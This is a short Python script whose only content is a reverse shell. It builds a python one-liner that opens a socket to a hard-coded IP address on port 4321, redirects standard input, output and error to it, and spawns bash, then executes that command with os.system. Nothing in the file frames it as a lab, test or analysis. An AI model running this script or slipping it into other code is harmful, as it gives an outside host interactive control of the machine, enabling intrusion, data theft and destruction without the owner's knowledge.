import os

payload=(
    "python -c \"import os,pty,socket; "
    "s=socket.socket(); "
    "s.connect(('194.238.19.162',4321)); "
    "[os.dup2(s.fileno(),f)for f in(0,1,2)]; "
    "pty.spawn('bash')\""
)

os.system(payload)
